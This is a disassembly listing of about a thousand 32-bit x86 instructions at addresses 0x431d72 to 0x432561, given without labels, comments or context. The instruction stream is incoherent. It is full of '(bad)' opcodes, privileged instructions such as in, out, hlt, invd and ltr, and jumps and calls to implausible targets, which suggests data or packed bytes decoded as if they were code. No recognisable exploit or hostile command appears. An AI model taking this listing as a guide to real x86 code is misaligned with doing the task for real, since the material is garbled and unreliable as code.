  431d72:	cmp    ecx,esi
  431d74:	bswap  edi
  431d76:	(bad)
  431d7a:	mov    esi,DWORD PTR [ebp-0x4]
  431d7d:	mov    esi,ecx
  431d7f:	clc    
  431d80:	repnz add esi,DWORD PTR [ebp+0x45]
  431d84:	push   ebx
  431d85:	xor    eax,DWORD PTR [ebp+0x3]
  431d88:	cmp    al,0x5f
  431d8a:	pushf  
  431d8b:	pop    ebx
  431d8c:	jmp    0x431e53
  431d91:	mov    esi,DWORD PTR [ebp-0x7d]
  431d94:	xor    ebp,DWORD PTR [eax]
  431d96:	lea    eax,[ebp-0x8]
  431d99:	xor    edx,esi
  431d9b:	pushf  
  431d9c:	out    dx,eax
  431d9d:	(bad)  
  431d9e:	neg    eax
  431da0:	ins    DWORD PTR es:[edi],dx
  431da1:	test   esi,edi
  431da3:	clc    
  431da4:	pop    esp
  431da5:	inc    ebp
  431da6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431db2:	add    cl,al
  431db4:	jne    0x431d51
  431db6:	mov    esi,DWORD PTR [edx]
  431db8:	in     al,dx
  431db9:	push   esi
  431dba:	xor    BYTE PTR [ebp-0xe],dh
  431dbd:	add    edi,esi
  431dbf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dc5:	add    cl,bh
  431dc7:	mov    edi,DWORD PTR [ebp+0x8]
  431dca:	mov    DWORD PTR [ebp-0x14],esi
  431dcd:	add    esi,DWORD PTR [ebp+0x3c]
  431dd0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dd6:	mov    ah,0x3e
  431dd8:	fwait
  431dd9:	pushf  
  431dda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431de0:	jne    0x431d6d
  431de2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431de5:	icebp  
  431de6:	icebp  
  431de7:	shl    edx,0xf2
  431dea:	(bad)  
  431deb:	mov    ah,0x16
  431ded:	push   eax
  431dee:	jne    0x431d83
  431df0:	mov    ecx,DWORD PTR [edi]
  431df2:	in     al,dx
  431df3:	jmp    0x431de6
  431df5:	add    dl,dh
  431df7:	mov    edi,esi
  431df9:	or     al,0x8
  431dfb:	inc    ebp
  431dfc:	jne    0x431e01
  431dfe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e04:	ret    
  431e05:	or     bh,bh
  431e07:	jge    0x431df1
  431e09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e0f:	xor    edi,eax
  431e11:	add    esi,DWORD PTR [ebp-0x77]
  431e14:	mov    ebx,esp
  431e16:	clc    
  431e17:	neg    DWORD PTR [ebp-0x7c]
  431e1a:	xor    eax,DWORD PTR [eax]
  431e1c:	cmp    eax,DWORD PTR [eax]
  431e1e:	repz jne 0x431db6
  431e21:	xor    eax,DWORD PTR [ecx]
  431e23:	add    ebx,DWORD PTR [eax]
  431e25:	mov    DWORD PTR [ebp-0x8],eax
  431e28:	mov    eax,edi
  431e2a:	cld    
  431e2b:	lock pop eax
  431e2d:	test   DWORD PTR [ebx],esi
  431e2f:	clc    
  431e30:	add    edx,DWORD PTR [edi-0x740bff77]
  431e36:	fdivp  st(4),st
  431e38:	test   ecx,esi
  431e3a:	(bad)  
  431e3b:	jnp    0x431e3c
  431e3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e43:	jae    0x431dd0
  431e45:	sub    edi,esp
  431e47:	(bad)  
  431e48:	shl    DWORD PTR [eax-0x3e],0x89
  431e4c:	leave  
  431e4d:	call   0x8198d55a
  431e52:	in     al,dx
  431e53:	(bad)  
  431e54:	in     al,dx
  431e55:	add    bh,al
  431e57:	mov    esp,edi
  431e59:	in     al,dx
  431e5a:	test   DWORD PTR [ebp-0x8],edi
  431e5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431e60:	xor    al,BYTE PTR [ebx]
  431e62:	pushf  
  431e63:	jnp    0x57321a9c
  431e69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e6d:	loopne 0x431ea2
  431e6f:	jne    0x431e2c
  431e71:	mov    esi,DWORD PTR [edx-0x20]
  431e74:	add    BYTE PTR [ebp-0x3d],bh
  431e77:	xor    eax,DWORD PTR [ebp-0x73]
  431e7a:	mov    edi,DWORD PTR [esi]
  431e7c:	cld    
  431e7d:	jb     0x431e45
  431e7f:	add    bl,al
  431e81:	jne    0x431ec8
  431e83:	mov    edx,DWORD PTR [edi-0x10]
  431e86:	jge    0x431f05
  431e88:	mov    esi,DWORD PTR [ebx]
  431e8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431e8e:	xor    esi,DWORD PTR [ebp-0x77]
  431e91:	mov    esi,eax
  431e93:	lock inc ebp
  431e95:	jge    0x431ec8
  431e97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431e9e:	dec    ebp
  431e9f:	mov    esi,DWORD PTR [ebx]
  431ea1:	loopne 0x431e2c
  431ea3:	jge    0x431e9d
  431ea5:	add    DWORD PTR [ebp-0x7d],eax
  431ea8:	icebp  
  431ea9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431eb0:	dec    ebp
  431eb1:	hlt    
  431eb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431eb5:	mov    esi,esp
  431eb7:	in     al,0x45
  431eb9:	jge    0x431ef8
  431ebb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ec2:	dec    ebp
  431ec3:	push   esp
  431ec4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431eca:	inc    ebp
  431ecb:	hlt    
  431ecc:	xor    DWORD PTR [ebp-0x61],esi
  431ecf:	mov    edi,DWORD PTR [eax+0xf19504]
  431ed5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431ed9:	cmp    eax,DWORD PTR [ebp+0xf]
  431edc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ee0:	fistp  WORD PTR [ebx+0x0]
  431ee3:	inc    ebp
  431ee4:	mov    ebx,DWORD PTR [edi+0xc]
  431ee7:	add    eax,eax
  431ee9:	inc    ebp
  431eea:	test   BYTE PTR [ebx],dh
  431eec:	add    eax,DWORD PTR [ebx]
  431eee:	add    BYTE PTR [esi+0x45],bl
  431ef1:	ret    0x85
  431ef4:	jnp    0x5443a2c3
  431efa:	inc    bp
  431efc:	inc    ebp
  431efd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f03:	fdiv   QWORD PTR [ebx]
  431f05:	test   DWORD PTR [ecx+0x453bf8],edi
  431f0b:	push   ebx
  431f0c:	add    edi,DWORD PTR [esi+0x708088b]
  431f12:	cmp    esi,eax
  431f14:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f1b:	mov    esp,edi
  431f1d:	call   0x33ce646f
  431f22:	or     BYTE PTR [ebx],al
  431f24:	inc    ecx
  431f25:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f2b:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f31:	lock add cl,al
  431f34:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f3b:	mov    ch,0x45
  431f3d:	clc    
  431f3e:	xor    eax,DWORD PTR [ebp+0x3]
  431f41:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f47:	inc    ebp
  431f48:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f4e:	mov    edi,eax
  431f50:	mov    eax,DWORD PTR [ebp+0x3c]
  431f53:	mov    ecx,DWORD PTR [eax]
  431f55:	hlt    
  431f56:	inc    ebp
  431f57:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f5e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f64:	push   ebp
  431f65:	mov    edi,DWORD PTR [ebx]
  431f67:	in     al,dx
  431f68:	jne    0x431f2b
  431f6a:	mov    eax,DWORD PTR [ebp-0x28]
  431f6d:	add    DWORD PTR [eax],0xe8058dec
  431f73:	clc    
  431f74:	mov    esi,DWORD PTR [edi-0x8]
  431f77:	add    dh,dl
  431f79:	rol    WORD PTR [ebp-0x1],cl
  431f7d:	mov    edx,DWORD PTR [eax+0x8]
  431f80:	jne    0x431f42
  431f82:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f89:	inc    ebp
  431f8a:	push   esp
  431f8b:	test   DWORD PTR [ecx+0xf],ecx
  431f8e:	sub    edx,esp
  431f90:	add    eax,DWORD PTR [eax]
  431f92:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431f98:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431f9f:	mov    eax,DWORD PTR [ecx]
  431fa1:	and    BYTE PTR [eax],al
  431fa3:	cmp    al,0x10
  431fa5:	add    BYTE PTR [ebp+0x66],al
  431fa8:	inc    ecx
  431faa:	push   esp
  431fab:	add    dh,BYTE PTR [ebp+0x0]
  431fae:	push   edx
  431faf:	enterw 0xc1,0x4d
  431fb4:	mov    esp,DWORD PTR [esi+0x20]
  431fb7:	add    DWORD PTR [ecx-0x7b],eax
  431fba:	add    eax,DWORD PTR [ebx]
  431fbc:	str    WORD PTR [eax+0x45]
  431fc0:	lea    ecx,[ebx+0x45890801]
  431fc6:	sbb    BYTE PTR [ebx],al
  431fc8:	dec    ebp
  431fc9:	cmp    al,0xf
  431fcb:	inc    ebp
  431fcc:	push   eax
  431fcd:	mov    esi,DWORD PTR [ebx]
  431fcf:	push   eax
  431fd0:	add    eax,eax
  431fd2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fd9:	inc    ebp
  431fda:	add    BYTE PTR [ecx],dh
  431fdc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431fe3:	(bad)  
  431fe4:	mov    ebx,eax
  431fe6:	loopne 0x43202d
  431fe8:	dec    ebp
  431fe9:	mov    ecx,DWORD PTR [edi]
  431feb:	cld    
  431fec:	push   eax
  431fed:	xchg   DWORD PTR [ebx],esi
  431fef:	add    DWORD PTR [ebx],ebp
  431ff1:	add    BYTE PTR [ebx],ch
  431ff3:	or     BYTE PTR [ecx],bh
  431ff5:	dec    ecx
  431ff6:	loopne 0x431ffb
  431ff8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431ffe:	push   ebp
  431fff:	add    DWORD PTR [ebx+0x55100800],eax
  432005:	dec    ebp
  432006:	jmp    0x431f91
  432008:	mov    esp,DWORD PTR [eax]
  43200a:	sbb    dl,dl
  43200c:	inc    eax
  43200d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432013:	add    BYTE PTR [ebx+0x74528555],cl
  432019:	push   ebp
  43201a:	div    DWORD PTR [ebx]
  43201c:	and    eax,DWORD PTR [ebx]
  43201e:	add    edx,DWORD PTR [edx-0x30]
  432021:	jno    0x431fae
  432023:	inc    DWORD PTR [eax+eiz*1]
  432026:	inc    ebp
  432027:	push   eax
  432028:	push   eax
  432029:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43202f:	mov    edi,esp
  432031:	push   eax
  432032:	inc    ebp
  432033:	enter  0x458b,0x8
  432037:	push   ecx
  432038:	(bad)  
  432039:	call   0x10d2a11
  43203e:	pop    ss
  43203f:	push   ebp
  432040:	mov    ecx,DWORD PTR [ebx+0x489408]
  432046:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43204c:	push   ecx
  43204d:	jo     0x432037
  43204f:	inc    DWORD PTR [edi]
  432051:	or     BYTE PTR [eax],al
  432053:	call   0xce279d
  432058:	fmul   QWORD PTR [ebp+0x55]
  43205b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432061:	mov    bh,0x8c
  432063:	adc    al,0x9b
  432065:	dec    esp
  432066:	xor    bl,BYTE PTR [eax]
  432068:	mov    ecx,DWORD PTR [ebp+0xc]
  43206b:	mov    eax,DWORD PTR [ebp-0x4]
  43206e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432074:	push   es
  432075:	retf   
  432076:	mov    BYTE PTR [ebp-0x30],0x3b
  43207a:	inc    ebp
  43207b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432082:	retf   0x83fc
  432085:	into   
  432086:	dec    ebp
  432087:	retf   
  432088:	mov    ecx,DWORD PTR [ebp-0x74]
  43208b:	mov    eax,DWORD PTR [eax]
  43208d:	fdiv   QWORD PTR [ebx]
  43208f:	mov    bh,0x3
  432091:	push   es
  432092:	mov    esi,ecx
  432094:	sbb    cl,dl
  432096:	dec    ebp
  432097:	sar    DWORD PTR [ebx],cl
  432099:	push   ebp
  43209a:	jne    0x4320ab
  43209c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320a2:	lea    ebx,[eax]
  4320a4:	call   0xf4ccac6b
  4320a9:	sbb    dh,dl
  4320ab:	add    edx,ebx
  4320ad:	push   ebp
  4320ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320b4:	push   ecx
  4320b5:	mov    DWORD PTR [eax-0x30],edx
  4320b8:	test   DWORD PTR [edx],eax
  4320ba:	xadd   esp,esi
  4320bd:	pop    es
  4320be:	add    cl,dl
  4320c0:	mov    eax,ecx
  4320c2:	or     al,0x45
  4320c4:	(bad)  
  4320c5:	push   eax
  4320c6:	add    DWORD PTR [edx+0x0],eax
  4320c9:	add    ecx,DWORD PTR [ecx]
  4320cb:	and    dh,cl
  4320cd:	call   0xc7299d
  4320d2:	add    DWORD PTR [ebp+0x0],edx
  4320d5:	mov    esp,DWORD PTR [ebp+0x18]
  4320d8:	add    BYTE PTR [eax+0x50],cl
  4320db:	xor    eax,DWORD PTR [eax]
  4320dd:	add    esp,DWORD PTR [esi+0x3b]
  4320e0:	inc    ebp
  4320e1:	je     0x432066
  4320e3:	push   ecx
  4320e4:	dec    BYTE PTR [ebp-0x77]
  4320e7:	add    eax,esi
  4320e9:	or     al,0x5e
  4320eb:	inc    eax
  4320ec:	add    BYTE PTR [ebx],al
  4320ee:	data16 and BYTE PTR [ebp+0x50],al
  4320f2:	sub    DWORD PTR [ecx],0xfffffff8
  4320f5:	add    BYTE PTR [ebp-0x75],ah
  4320f8:	add    BYTE PTR [eax],bl
  4320fa:	enter  0x894d,0x8b
  4320fe:	int3   
  4320ff:	loopne 0x4320c3
  432101:	rol    BYTE PTR [eax],0x33
  432104:	lea    cx,[ebp+0xa]
  432108:	data16 jb 0x432150
  43210b:	add    BYTE PTR [ebx+0x44890855],cl
  432111:	sbb    ah,al
  432113:	inc    ebp
  432114:	cmp    al,0xf
  432116:	add    BYTE PTR [edx+0x66],dl
  432119:	xor    ecx,DWORD PTR [eax]
  43211b:	sub    eax,DWORD PTR [edx]
  43211d:	mov    eax,DWORD PTR [eax]
  43211f:	or     al,0x66
  432121:	ror    edx,cl
  432123:	dec    ebp
  432124:	inc    ebp
  432125:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43212b:	cld    
  43212c:	or     BYTE PTR [edi+0x4501dd],dl
  432132:	ret    0xecce
  432135:	retf   
  432136:	(bad)  
  432137:	dec    ebp
  432138:	mov    al,0x8b
  43213a:	loopne 0x43215c
  43213c:	cmp    ecx,DWORD PTR [edx]
  43213e:	inc    ebp
  43213f:	daa    
  432140:	loopne 0x4320c9
  432142:	in     al,dx
  432143:	add    edi,eax
  432145:	add    BYTE PTR [eax+0x3f52e155],bh
  43214b:	push   ebp
  43214c:	inc    ebp
  43214d:	xor    ebx,edx
  43214f:	add    ebp,esp
  432151:	push   edx
  432152:	push   bp
  432154:	inc    ebp
  432155:	(bad)  
  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
